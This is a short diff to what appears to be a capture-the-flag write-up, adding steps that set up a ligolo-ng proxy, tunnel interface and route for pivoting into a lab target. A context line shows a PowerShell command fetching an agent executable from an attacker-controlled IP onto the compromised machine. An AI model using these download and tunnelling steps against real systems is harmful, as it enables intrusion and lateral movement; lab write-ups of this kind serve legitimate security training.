@@ -659,6 +659,18 @@ C:\Users\C.Bum\Documents>powershell -c wget http://10.10.14.90:8000/agent.exe -o
 This transferred it to the target
 
 ```python
+sudo ./proxy -selfcert
+
+ligolo-ng » ifcreate --name flight
+INFO[0072] Creating a new flight interface...           
+INFO[0072] Interface created!                           
+ligolo-ng » route_add --name flight --route 240.0.0.1/32
+INFO[0102] Route created.                               
+ligolo-ng »  
+```
+This has configured ligolo-ng routing info
+
+```python
 
 ```
 
